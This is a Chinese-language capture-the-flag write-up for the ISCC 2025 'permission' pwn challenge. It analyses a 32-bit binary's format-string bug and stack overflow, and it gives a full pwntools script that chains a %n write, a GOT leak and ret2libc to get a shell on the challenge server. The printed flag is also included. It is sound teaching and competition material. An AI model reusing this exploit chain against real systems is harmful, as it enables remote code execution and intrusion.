# ISCC 2025 PWN — permission 题解

## 题目信息

- **描述**: Ready to begin the game? A simple conversation can change everything.
- **地址**: `39.96.193.120:10000`
- **Flag**: `ISCC{e2d72fc8-fd71-4339-a79f-43a23013d374}`

## 文件分析

```
$ file attachment-9
ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped

$ checksec attachment-9
RELRO: Partial RELRO     ← GOT 可写，可利用延迟绑定
Stack: No canary found   ← 栈无保护，可溢出
NX: NX enabled           ← 栈不可执行，需 ROP
PIE: No PIE              ← 地址固定，无需泄露基址
```

保护较弱，32 位无栈保护，二进制地址固定。

---

## 逆向分析

### main 函数

```c
char s[32];               // [ebp-0x28]
init();
puts("Ready to begin the game? ...");
puts("Hope you have a good time here.");
memset(s, 0, sizeof(s));
read(0, s, 0x20);         // 读入 32 字节
printf(s);                // 格式串漏洞！
if (*(int*)x == 5)
    vuln();               // target_val == 5 时进入
else
    puts("Alright, it doesn't matter.");
```

关键符号：

| 符号 | 地址 |
|------|------|
| `target_val` | `0x804c030` |
| `vuln` | `0x8049227` (本地) / `0x804929b` (远程 CET 布局) |
| `write@plt` | `0x8049080` (本地) / `0x80490f0` (远程) |
| `write@got` | `0x804c01c` |
| `puts@plt` | `0x8049060` |

### vuln 函数

```c
char buf[140];            // [ebp-0x90]
write(1, "Input:\n", 7);
read(0, buf, 0x100);      // 栈溢出！0x100 > 0x8c
```

分配的缓冲区仅 140 字节（0x8c），但 read 允许读入 0x100 = 256 字节。  
栈布局：

```
[ebp-0x90]  buf[0..139]    (0x8c 字节)
[ebp-0x04]  saved_ebx      (4 字节)
[ebp+0x00]  saved_ebp      (4 字节)
[ebp+0x04]  返回地址        (4 字节)  ← 从这里开始覆盖
[ebp+0x08]  后续栈参数
```

偏移量：`0x90 + 0x04 = 0x94 = 148 字节` 到达返回地址。

---

## 利用思路

采用三阶段攻击，每个阶段解决一个问题：

### 第 1 阶段 — 格式串写入

`printf(s)` 是明显的格式串漏洞。在 32 位 cdecl 调用约定下，`printf` 的参数从栈上顺序排列。通过测试：

```
输入: AAAA.%p.%p.%p.%p
输出: AAAA.0xff...|0x20|0x8049292|0x41414141
```

可知**用户输入从第 4 个参数开始**（`%4$` 对应 buffer 前 4 字节）。

因此构造 payload：

```
p32(0x804c030) + b"X%4$n"
```

- `p32(target_val)` — 4 字节，放在 buffer 开头（`%4$` 指向它）
- `b"X"` — 1 字节，累计输出 = 5
- `%4$n` — 将 5 写入 `%4$` 指向的地址 = target_val

执行后 `target_val = 5`，main 调用 vuln()。

### 第 2 阶段 — 泄露 libc 地址

进入 vuln 后，利用栈溢出构造 ROP 链：

```
write(1, write@GOT, 4) → vuln
```

- 调用 `write` 将 `write@GOT` 中的 libc 地址发回
- 注意：因为**延迟绑定**，write@GOT 在 vuln 调用 `write("Input:\n")` 后才被解析
- 之后返回到 vuln 第二轮

接收到 4 字节的 write 地址后，计算 libc 基址：

```
libc_base = leaked_write - WRITE_OFFSET
```

### 第 3 阶段 — ret2libc

第二轮溢出：

```
system("/bin/sh")
```

使用已知的 libc 偏移计算 system 和 `/bin/sh` 的地址。

### libc 偏移

远程 libc 为 `libc6-i386_2.31-0ubuntu9.17_amd64`，关键偏移：

| 函数 | 偏移 |
|------|------|
| write | `0x00f0830` |
| system | `0x041360` |
| `/bin/sh` | `0x018c363` |

---

## 补充：格式串直接泄露

除了溢出泄露，也可以用格式串直接泄露**已解析的 GOT 项**。  
例如 `puts` 在 banner 输出时已被调用，`puts@GOT` 肯定已填入 libc 地址：

```
payload = p32(target_val) + b"X%4$nJJJ" + p32(puts_got) + b"%7$s\x00"
```

- `%4$n` — 将 5 写入 `target_val`
- `%7$s` — 解引用 `puts@GOT` 输出 puts 的 libc 地址

此法最大优势是**两阶段即可打通**（省去一次溢出），但需要知道远程 `puts` 在 libc 中的偏移。

---

## Exploit

完整脚本见 [exploit.py](exploit.py)。

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "i386"
context.log_level = args.LOG or "info"

# ── 固定地址 ─────────────────────────────────────────────────────
TARGET_VAL = 0x804c030    # main 检查的全局变量
VULN       = 0x804929b    # 远程 vuln 地址
WRITE_PLT  = 0x80490f0    # 远程 write@PLT
WRITE_GOT  = 0x804c01c    # write@GOT
OFFSET     = 0x94         # 缓冲区到返回地址的偏移

# ── libc 偏移 ─────────────────────────────────────────────────────
WRITE_OFF  = 0x00f0830
SYSTEM_OFF = 0x041360
BINSH_OFF  = 0x018c363

def connect():
    io = remote(args.HOST or "39.96.193.120",
                int(args.PORT or 10000), timeout=10)
    io.recvuntil(b"Hope you have a good time here.\n")
    return io

def stage1_fmt_write(io):
    """格式串: target_val = 5 → 进入 vuln"""
    payload = p32(TARGET_VAL) + b"X%4$n"
    payload = payload.ljust(32, b"\x00")[:32]
    io.send(payload)

def stage2_leak(io):
    """溢出泄露: write(1, write@GOT, 4) → vuln"""
    chain = flat(
        {0: b"A" * (OFFSET - 8)},
        b"B" * 4,           # saved ebx
        b"C" * 4,           # saved ebp
        WRITE_PLT,          # → write
        VULN,               # ← 回 vuln
        1, WRITE_GOT, 4,    # write(1, write_got, 4)
    )
    io.send(chain)
    write_addr = u32(io.recvn(4, timeout=5))
    io.recvuntil(b"Input:\n", timeout=3)
    return write_addr

def stage3_system(io, write_addr):
    """溢出: system("/bin/sh")"""
    libc_base = write_addr - WRITE_OFF
    chain = flat(
        {0: b"A" * (OFFSET - 8)},
        b"B" * 4, b"C" * 4,
        libc_base + SYSTEM_OFF,
        0xDEADBEEF,
        libc_base + BINSH_OFF,
    )
    io.send(chain)

def exploit():
    io = connect()
    log.info("Stage 1 — fmt → target_val = 5")
    stage1_fmt_write(io)

    log.info("Stage 2 — leak write@GOT")
    write_addr = stage2_leak(io)

    log.info("Stage 3 — ret2libc system()")
    stage3_system(io, write_addr)

    sleep(0.3)
    io.sendline(b"cat /flag* 2>/dev/null; cat flag 2>/dev/null")
    io.interactive()

if __name__ == "__main__":
    exploit()
```

运行：

```bash
python3 exploit.py
```

---

## 总结

| 阶段 | 漏洞 | 利用方式 |
|------|------|----------|
| 1 | 格式串 | `%4$n` 向 `target_val` 写入 5 |
| 2 | 栈溢出 | ROP 调用 write 泄露 GOT |
| 3 | 栈溢出 | ROP 调用 `system("/bin/sh")` |

两道防御关卡——格式串写入绕过变量检查、栈溢出完成控制流劫持——分别对应两个漏洞的串联利用。关键是理解延迟绑定机制：write@GOT 在 vuln 调用 write 后才解析，因此不能用格式串直接泄露 write，而需要先进入 vuln 触发解析，再通过第二次溢出泄露。
